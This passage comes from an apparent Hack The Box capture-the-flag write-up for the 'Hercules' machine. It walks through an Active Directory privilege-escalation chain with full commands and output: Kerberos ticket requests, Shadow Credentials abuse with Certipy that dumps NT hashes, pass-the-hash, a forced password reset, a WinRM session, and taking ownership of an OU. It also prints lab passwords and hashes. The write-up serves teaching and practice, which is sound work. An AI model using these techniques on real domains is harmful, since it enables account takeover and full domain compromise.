└─$ impacket-getTGT -dc-ip 10.129.11.157 hercules.htb/natalie.a:Prettyprincess123!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in natalie.a.ccache
```

The request was sent to the Domain Controller at `10.129.11.157` using the recovered credentials for `hercules.htb\natalie.a`. The successful issuance of a **Kerberos TGT** confirmed that the account credentials were valid and accepted by the domain's authentication service.

Upon successful authentication, **Impacket** automatically stored the issued ticket in a local credential cache file named `natalie.a.ccache`. This cache can be reused by Kerberos-enabled tools, allowing subsequent authentication without repeatedly supplying the plaintext password. It also enables **pass-the-ticket (PTT)** techniques and facilitates further Kerberos-based enumeration and exploitation.

## Exploiting Shadow Credentials to Impersonate `bob.w`

With a valid **Kerberos TGT** for `natalie.a` in place, the next objective was to leverage **Shadow Credentials** to gain access to another user account. Based on the earlier **BloodHound** analysis, I had already determined that `natalie.a` possessed the necessary permissions over `bob.w`, making it an ideal candidate for this technique.

To carry out the attack, I reused Natalie's Kerberos ticket by exporting the credential cache and then invoked **Certipy's** `shadow` module. This operation automatically added a malicious **Key Credential** to `bob.w`**'s** account, enabling certificate-based authentication without requiring the user's password.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account bob.w
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '947d8da8-c471-1d71-3eae-9424ff3b6b71'
[*] Adding Key Credential with device ID '947d8da8-c471-1d71-3eae-9424ff3b6b71' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID '947d8da8-c471-1d71-3eae-9424ff3b6b71' to the Key Credentials for 'bob.w'
/usr/lib/python3/dist-packages/certipy/lib/certificate.py:519: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
.
.
.
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

**Certipy** generated a certificate and temporarily populated `bob.w`**'s** `msDS-KeyCredentialLink` attribute with a new **Key Credential**. This modification enabled **certificate-based Kerberos authentication**, allowing me to obtain access to `bob.w` without possessing the account's password. Using the injected credential, I successfully requested a **Kerberos TGT**, which was saved locally as `bob.w.ccache`.

Once authenticated as `bob.w`, I extracted the account's **NTLM hash** before allowing **Certipy** to automatically restore the original `msDS-KeyCredentialLink` value, effectively removing the injected credential and minimizing artifacts left behind. At this point, I had successfully compromised the `bob.w` account and obtained reusable authentication material that could be leveraged for subsequent lateral movement or privilege escalation.

## Requesting a Kerberos TGT via Pass-the-Hash

After recovering `bob.w`**'s** NTLM hash, the next step was to verify that it could be used for **Kerberos** authentication without requiring the account's plaintext password. To accomplish this, I performed a **pass-the-hash** attack by requesting a **Ticket Granting Ticket (TGT)** directly from the Domain Controller.

I used **Impacket's** `getTGT` utility, supplying `bob.w`**'s** NTLM hash while targeting the Domain Controller at `10.129.11.157`. Successfully obtaining a TGT would confirm that the recovered hash was valid and could be leveraged for subsequent Kerberos-authenticated operations.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT -dc-ip 10.129.11.157 -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in bob.w.ccache
```

The Domain Controller successfully validated `bob.w`**'s** NTLM hash and issued a **Kerberos Ticket Granting Ticket (TGT)**. **Impacket** automatically stored the ticket in a local credential cache file named `bob.w.ccache`, confirming that the recovered hash was valid for Kerberos authentication.

With a reusable **Kerberos** ticket now available, I could authenticate as `bob.w` using **pass-the-ticket (PTT)** techniques, eliminating the need for the account's plaintext password. This ticket could then be leveraged for additional Active Directory enumeration, lateral movement, or further privilege escalation activities.

## Enumerating Active Directory Objects Writable by `bob.w`

After obtaining a valid **Kerberos TGT** for `bob.w`, the next objective was to determine what permissions this account possessed within the Active Directory environment. Instead of speculating on potential escalation paths, I focused on identifying directory objects over which `bob.w` had **write** or **create** privileges, as these permissions frequently expose opportunities for privilege escalation.

To accomplish this, I reused `bob.w`**'s** Kerberos credential cache and queried the domain with `bloodyAD` to enumerate all objects on which the account had writable permissions. By explicitly authenticating with the existing Kerberos ticket, I was able to inspect delegated access rights without supplying additional credentials.

```shell
KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -k -d 'hercules.htb' --host DC.hercules.htb get writable --detail
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fy3pZd3R6PaRF9ErvFC7Q%252FScreenshot%2520%282809%29.png%3Falt%3Dmedia%26token%3D56b22093-c8fa-4891-85f8-b8af1b705073&width=768&dpr=3&quality=100&sign=dd9a6574&sv=2)

The enumeration results showed that `bob.w` possessed broad write permissions across numerous **Organizational Units (OUs)**, security groups, and user objects. Of particular interest was the presence of `CREATE_CHILD` privileges on several high-value OUs, including the **Engineering Department**, **Security Department**, and **Web Department**.

The `CREATE_CHILD` permission allows new directory objects—such as users, groups, or computer accounts—to be created within the affected OUs. From an attacker's perspective, this represents a powerful Active Directory primitive that can often be leveraged to establish persistence or facilitate further privilege escalation.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FzX9SQjE5mtGdj93I09Uf%252FScreenshot%2520%282810%29.png%3Falt%3Dmedia%26token%3Dee2154ea-6b0f-4ddc-b18f-4720125f6cd6&width=768&dpr=3&quality=100&sign=3b1db281&sv=2)

In addition to the delegated permissions over Organizational Units, the enumeration also revealed that `bob.w` had direct **WRITE** access to several user and group objects. These permissions allowed modification of common attributes such as `name` and `cn` on multiple accounts.

More significantly, `bob.w` had extensive write permissions over the **Bob Wood** user object itself. Among the writable attributes were security-sensitive fields such as `msDS-AllowedToActOnBehalfOfOtherIdentity`, certificate-related attributes, and various authentication and logon properties. Access to these attributes provides powerful Active Directory abuse opportunities and can serve as a foundation for additional privilege escalation techniques.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fm4vuNkUMlKw2F5T0IKaX%252FScreenshot%2520%282811%29.png%3Falt%3Dmedia%26token%3D3abba0a7-8614-43d9-9189-8d6286608813&width=768&dpr=3&quality=100&sign=120ad3d4&sv=2)

The discovery of write access to several security-critical attributes pointed to multiple potential privilege escalation techniques, including **delegation abuse**, **certificate-based authentication attacks**, and direct **account manipulation**. These permissions significantly expanded the attack surface beyond simple object modification.

At this stage, it was clear that compromising `bob.w` provided far more than a limited foothold. The account possessed extensive control over important Active Directory objects, creating several viable paths toward elevated privileges and, ultimately, broader control of the domain.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FexeVySjGki5GAMozLUub%252FScreenshot%2520%282818%29.png%3Falt%3Dmedia%26token%3D13dc5609-b1e6-4c8e-bccc-1da07557a5e8&width=768&dpr=3&quality=100&sign=e76e7642&sv=2)

After establishing that `bob.w` had significant delegated permissions within Active Directory, I wanted a more versatile tool for conducting LDAP-based reconnaissance and inspecting ACLs, group memberships, and object attributes directly from the command line. To support this phase of the assessment, I installed **powerview.py**, a Python implementation that replicates many of the reconnaissance capabilities of the original **PowerView** toolkit.

Using this tool provided a convenient way to perform more targeted Active Directory enumeration while leveraging the privileges already available to `bob.w`.

## Authenticating to LDAPS Using powerview.py as `bob.w`

After installing **powerview.py**, I used it to establish an interactive LDAP session for validating permissions and performing additional Active Directory enumeration. Because I already possessed a valid **Kerberos TGT** for `bob.w`, I reused the existing ticket cache instead of authenticating with plaintext credentials.

To ensure that all directory queries were encrypted, I launched **PowerView.py** with `bob.w`**'s** Kerberos credential cache and configured it to communicate with the Domain Controller over **LDAPS**.

```shell
KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps -d --no-pass
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FoNHeKZnbZqX83pNcazpn%252FScreenshot%2520%282819%29.png%3Falt%3Dmedia%26token%3D10f3aab7-5192-41e2-8baf-617ddbf61278&width=768&dpr=3&quality=100&sign=193d8360&sv=2)

powerview.py initialized successfully by creating its local logging directory and setting up the LDAP connection. The output indicated that the domain enforces modern security mechanisms, including **LDAP signing**, **LDAP sealing**, and **TLS channel binding**, which are commonly found in hardened Active Directory environments.

Since I was authenticating with **Kerberos**, PowerView.py first searched for the appropriate LDAP service ticket (SPN) before reusing the **TGT** referenced by `KRB5CCNAME`. It initially attempted to authenticate to `ldaps://dc.hercules.htb:636` using **SASL/GSSAPI**, but the Domain Controller responded with an `LDAPAuthMethodNotSupportedResult`. Rather than terminating, the tool automatically switched to Impacket's Kerberos authentication method, retried the bind operation, and successfully established an authenticated **LDAPS** session.

With authentication complete, I now had an interactive LDAP session as `bob.w`, allowing me to enumerate directory objects, inspect ACLs, review group memberships, and investigate additional Active Directory misconfigurations directly from the domain.

## Leveraging Write Permissions to Relocate `stephen.m` into the `Web Department` OU

With an authenticated **LDAPS** session established as `bob.w`, I next validated whether the delegated write permissions identified during enumeration could be leveraged to modify Active Directory objects. Since the earlier ACL analysis showed that `bob.w` had the necessary privileges over specific user objects, I attempted to relocate an existing account into an Organizational Unit (OU) under my control.

To achieve this, I used **PowerView's** `Set-DomainObjectDN` function to update the **Distinguished Name (DN)** of `stephen.m`, effectively moving the account from the **Security Department** OU into the **Web Department** OU. This operation demonstrated that the delegated permissions were sufficient to manipulate the object's placement within the directory.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─ ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
[2026-06-27 05:42:51] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2026-06-27 05:42:51] [Get-DomainObject] LDAP search filter: (&(objectClass=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))                      
[2026-06-27 05:42:51] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2026-06-27 05:42:51] [Get-DomainObject] LDAP search filter: (&(objectClass=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2026-06-27 05:42:51] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb                                                                            
[2026-06-27 05:42:51] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

PowerView began by resolving the identity of `stephen.m`, confirming the account's existing **Distinguished Name (DN)** within Active Directory. After validating that the target **Web Department** OU was present, it updated the object's DN, successfully relocating `CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb` to the **Web Department** OU.

This successful operation verified that `bob.w` possessed sufficient write privileges to modify user objects, including relocating them between Organizational Units. In Active Directory, this capability can have significant security implications, as moving an account into an OU with different delegated permissions or less restrictive ACLs may expose it to additional abuse, such as password resets, group membership changes, or other privilege escalation opportunities.

## Obtaining a Fresh Kerberos TGT for `natalie.a`

After performing several Active Directory modifications and privilege escalation steps, I refreshed my Kerberos credentials to ensure I was working with a valid and up-to-date **Ticket Granting Ticket (TGT)** for `natalie.a`. Instead of relying on an existing credential cache, I requested a new TGT directly from the Domain Controller using **Impacket**.

To accomplish this, I authenticated with `natalie.a`**'s** plaintext credentials and requested a fresh Kerberos ticket before proceeding with the next stage of the assessment.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in natalie.a.ccache
```

## Exploiting Shadow Credentials to Gain Access to `stephen.m`

After relocating `stephen.m` into the **Web Department** OU, I investigated whether the move had introduced new opportunities for privilege escalation. With a valid **Kerberos TGT** for `natalie.a` already available and the required delegated permissions in place, I attempted to leverage **Shadow Credentials** to obtain access to Stephen's account without recovering or resetting his password.

Using `natalie.a`**'s** existing Kerberos ticket, I invoked **Certipy's** automated Shadow Credentials functionality to target `stephen.m`, aiming to inject a temporary **Key Credential** and authenticate as the account through certificate-based authentication.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '183ec2c8-5bad-ab46-1de6-782aa48ba586'
[*] Adding Key Credential with device ID '183ec2c8-5bad-ab46-1de6-782aa48ba586' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID '183ec2c8-5bad-ab46-1de6-782aa48ba586' to the Key Credentials for 'stephen.m'
/usr/lib/python3/dist-packages/certipy/lib/certificate.py:519: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return x509.load_der_x509_certificate(certificate)
.
.
.
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
```

**Certipy** began by generating a certificate along with a new **Key Credential**, which it temporarily inserted into `stephen.m`**'s** `msDS-KeyCredentialLink` attribute. This modification enabled **certificate-based Kerberos authentication**, allowing me to request a **Kerberos Ticket Granting Ticket (TGT)** for `stephen.m` without requiring the account's password.

The issued ticket was saved locally as `stephen.m.ccache`, confirming successful authentication as `stephen.m`. After obtaining access, **Certipy** restored the original `msDS-KeyCredentialLink` value to remove the injected credential and reduce the forensic footprint before extracting **Stephen's NTLM hash**.

By the end of this process, I had obtained both a reusable **Kerberos TGT** and the **NTLM hash** for `stephen.m`. This demonstrated that the account could be fully compromised through **ACL abuse** combined with the **Shadow Credentials** technique, without ever requiring or exposing the user's original password.

## Requesting a Kerberos TGT for `stephen.m` Using Pass-the-Hash

After recovering `stephen.m`**'s** NTLM hash through the **Shadow Credentials** attack, the next step was to confirm that it could be used directly for **Kerberos** authentication. Rather than relying on the certificate-based ticket obtained earlier, I validated the compromise by performing a **pass-the-hash** attack.

To do this, I used **Impacket** to request a **Kerberos Ticket Granting Ticket (TGT)** for `stephen.m`, authenticating solely with the recovered **NTLM hash**. Successfully obtaining a new TGT would demonstrate that the hash alone was sufficient for Kerberos-based authentication and could be reused in subsequent operations.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in stephen.m.ccache
```

With the compromise of `stephen.m` complete, I now had multiple authentication methods at my disposal. I could access the account using either the previously obtained **certificate-based credentials** or the **Kerberos TGT** acquired through the **pass-the-hash** technique, providing several options for authenticating without relying on the user's plaintext password.

Having these reusable authentication artifacts enabled continued **LDAP enumeration**, **lateral movement**, and additional **privilege escalation** activities within the Active Directory environment while maintaining flexibility throughout the remainder of the assessment.

## Exploiting `ForceChangePassword` Permissions to Reset the `Auditor` Account

After obtaining a valid **Kerberos TGT** for `stephen.m`, I investigated whether the account's delegated privileges could be used for further escalation. Earlier **BloodHound** and ACL analysis had shown that `stephen.m`, through membership in the **Security Helpdesk** group, possessed `ForceChangePassword` rights over several domain accounts, including `Auditor`.

To validate this privilege, I reused `stephen.m`**'s** Kerberos ticket cache and attempted to reset the `Auditor` account's password without knowing its existing credentials. The operation was performed with `bloodyAD`, authenticating exclusively through **Kerberos**.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=stephen.m.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'GodOfThunder123!'
[+] Password changed successfully!
```

The password reset operation completed successfully, demonstrating that `stephen.m` possessed the delegated `ForceChangePassword` permission required to modify the `Auditor` account's password. As a result, I gained full access to the account without needing to recover the original password or rely on any interaction from the user.

This represented another straightforward privilege escalation step within the domain. By abusing delegated password reset rights, I was able to transition from control of `stephen.m` to direct control of the `Auditor` account, expanding my level of access through legitimate Active Directory permissions rather than exploiting a software vulnerability.

## Requesting a Kerberos TGT for the `Auditor` Account

After resetting the `Auditor` account's password, the next step was to verify that the newly assigned credentials were accepted by the domain. To validate this, I requested a fresh **Kerberos Ticket Granting Ticket (TGT)** directly from the **Domain Controller** using **Impacket**.

I authenticated as `Auditor` with the updated password and submitted the TGT request to the Domain Controller at `10.129.11.157`. Successfully obtaining a ticket would confirm that the password reset had taken effect and that the account could now be used for Kerberos-authenticated operations.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ impacket-getTGT -dc-ip 10.129.11.157 hercules.htb/Auditor:GodOfThunder123!
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Auditor.ccache
```

## Preparing for Lateral Movement via WinRM

With valid credentials in hand, the next objective was to establish remote access to the target using **WinRM**, a management service that is frequently enabled in Windows domain environments for authenticated users. To facilitate this stage of the assessment, I cloned the `winrmexec` repository from [GitHub](https://github.com/ozelis/winrmexec) and prepared a local copy of the tool for use during the remainder of the attack chain.

## Establishing an Initial WinRM Session as `Auditor`

With valid credentials confirmed, the next objective was to obtain an interactive session on the target system. Since **WinRM** was available, I chose to authenticate using **Kerberos pass-the-ticket** rather than supplying the account's password, allowing me to reuse the previously acquired authentication material.

To accomplish this, I exported the `Auditor` Kerberos ticket cache and used it to authenticate with `evil_winrmexec`, establishing a **WinRM** session with the Domain Controller.

```shell
KRB5CCNAME=Auditor.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFJP2kkpL0HBizsHPsuVW%252FScreenshot%2520%282821%29.png%3Falt%3Dmedia%26token%3D1a3b33af-76d3-451f-89b6-60433f1e1957&width=768&dpr=3&quality=100&sign=ca6c7d17&sv=2)

`evil_winrmexec` identified the account information from the existing **Kerberos** credential cache (`HERCULES.HTB\Auditor`) and requested the appropriate service ticket for the `HTTP/dc.hercules.htb` Service Principal Name (SPN). Because **WinRM** was configured to use **HTTPS** on port **5986**, the authentication process completed securely without requiring the account's plaintext password.

After the Kerberos authentication succeeded, I was presented with a **PowerShell** session running under the security context of the `Auditor` account. Although the session was not fully interactive, it provided all the functionality needed to execute commands, perform system enumeration, and continue the post-exploitation process.

User Flag is located in `C:\Users\auditor\Desktop`

## Enumerating the `Auditor` Account's Group Memberships

After establishing a **WinRM** session as `Auditor`, the next step was to determine the account's effective privileges on both the local system and within the Active Directory domain. Enumerating the user's security group memberships provides a quick way to identify delegated permissions and potential privilege escalation opportunities.

From the **Auditor** PowerShell session, I executed the following command to list the groups associated with the current user:

```powershell
PS C:\Users\auditor\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

The command listed all local and domain groups associated with the **Auditor** account. Most of the memberships, such as **Everyone**, **Authenticated Users**, and **BUILTIN\Users**, were standard groups assigned to regular domain users.

More importantly, I confirmed that **Auditor** belongs to **BUILTIN\Remote Management Users**, which explains why I was able to establish a **WinRM** session. The account is also a member of **HERCULES\Domain Employees** and **HERCULES\Forest Management**. Although these memberships do not provide local administrator privileges, they may grant delegated permissions within Active Directory that could be useful later. The session was running with a **Medium Mandatory Level**, confirming that I was operating as a standard user rather than with elevated privileges.

Overall, this enumeration showed that while the **Auditor** account did not have administrative access, it had sufficient permissions for remote management and domain interaction, making it a solid foothold for the next stage of privilege escalation.

## Reviewing Delegated Permissions on the `Forest Migration` OU

After confirming that the **Auditor** account belongs to the **Forest Management** group, I investigated whether this membership granted any delegated privileges that could be leveraged for further escalation. To identify any interesting access rights, I imported the **Active Directory** PowerShell module and examined the access control list (**ACL**) of the **Forest Migration** Organizational Unit (OU).

Inspecting the OU's permissions would reveal whether the group had delegated rights that could be abused to modify Active Directory objects or facilitate additional privilege escalation.

```powershell
PS C:\Users\auditor\Desktop> Import-Module ActiveDirectory
PS C:\Users\auditor\Desktop> (Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference -like "*Forest M
anagement*"} | Format-List *


ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

I queried the ACL of the **Forest Migration** OU and filtered the results to display only the permissions assigned to the **Forest Management** group. This made it easier to identify the privileges available through my current group membership.

The results showed that the group has both `GenericRead` and `GenericAll` permissions on the OU. While `GenericRead` allows members to view objects and their attributes, `GenericAll` grants full control over the OU and the objects it contains. This includes creating, modifying, deleting objects, and changing their permissions.

This was a key finding because it meant the **Auditor** account, through its membership in **Forest Management**, had complete control over the **Forest Migration** OU. Such broad permissions provide several opportunities for privilege escalation, making this ACL misconfiguration a clear path for further compromise.

## Taking Ownership of the `Forest Migration` OU

After verifying that I had full control over the **Forest Migration** Organizational Unit (OU), I proceeded to take ownership of the object. In **Active Directory**, the owner of an object can always modify its permissions, making ownership a valuable privilege for maintaining control.

Using `bloodyAD` while authenticated as the **Auditor** account, I updated the owner of the **Forest Migration** OU to my current user. This ensured that I retained the ability to manage the OU's permissions regardless of future ACL changes.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host DC.hercules.htb -d hercules.htb -u Auditor -p 'GodOfThunder123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by Auditor on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

The `bloodyAD` command connected to the Domain Controller and successfully changed the owner of the **Forest Migration** OU to the **Auditor** account. Although I already had delegated permissions over the OU, becoming its owner provides an additional level of control, as the owner can always modify the object's security settings.

The output confirmed that the operation completed successfully. Ownership of the OU was transferred from the previous owner, **Domain Admins**, to **Auditor**.

This marked an important step in the privilege escalation process. As the owner of the **Forest Migration** OU, I could freely modify its ACLs, delegate permissions, and manage the objects contained within it, making the OU a valuable point for further Active Directory abuse and domain escalation.

## Assigning `GenericAll` Permissions on the `Forest Migration` OU

After becoming the owner of the **Forest Migration** Organizational Unit (OU), I reinforced my access by explicitly granting the **Auditor** account `GenericAll` permissions. While ownership alone is sufficient to modify an object's security settings, assigning `GenericAll` ensures full control is explicitly defined within the ACL.

To accomplish this, I used `bloodyAD` with my existing **Kerberos** ticket to update the OU's permissions, granting the **Auditor** account unrestricted access to the **Forest Migration** OU.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Hercules]
└─$ KRB5CCNAME=Auditor.ccache bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

The command updated the ACL of the **Forest Migration** OU, granting the **Auditor** account `GenericAll` permissions. This provides full control over the OU, including the ability to create, modify, delete, and manage objects within it.

The output confirmed that the permission change was successful. With `GenericAll` now assigned, I had complete control over the **Forest Migration** OU, giving me a reliable location to create new objects and carry out additional privilege escalation techniques.

## Enumerating User Accounts in the `Forest Migration` OU

After gaining full control over the **Forest Migration** OU, I examined the user objects it contained to identify potential targets for further privilege escalation. During this enumeration, the `Fernando.R` account stood out, prompting a closer inspection of its Active Directory attributes.

To gather additional information, I queried `Fernando.R`**'s** user object directly from Active Directory using the following command:

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "Fernando.R"
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

The results confirmed that **Fernando Rodriguez** is a valid domain user located in the **Forest Migration** OU. The most notable finding was that the account is currently **disabled**, which explains why it had not appeared during earlier authentication attempts.

Because the account resides in an OU that I fully control, I have the ability to manage it, including re-enabling the account, resetting its password, or modifying its attributes. Disabled accounts are often overlooked in enterprise environments, making them useful targets for privilege escalation.

With full control over the **Forest Migration** OU, `fernando.r` became the next logical target for further exploitation.

## Analyzing `Fernando.R`'s Group Memberships

After identifying `Fernando.R` as a disabled account within the **Forest Migration** OU, I returned to **BloodHound** to examine the permissions and group memberships associated with the account. My goal was to determine what level of access **Fernando** would have if the account were re-enabled.

The BloodHound graph revealed that `Fernando.R` was far more valuable than an ordinary inactive user, making the account a promising target for the next stage of the attack.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FwrfYent7YLQv7nPSEV1e%252FScreenshot%2520%282823%29.png%3Falt%3Dmedia%26token%3D00cf9223-e6be-4275-82cb-48f2e7f2fd96&width=768&dpr=3&quality=100&sign=282fd929&sv=2)

The BloodHound graph showed that `Fernando.R` is a member of the standard **Domain Users** and **Domain Employees** groups. More importantly, the account also belongs to **Smartcard Operators**, a privileged group associated with **smartcard authentication** and **certificate management** in Active Directory.

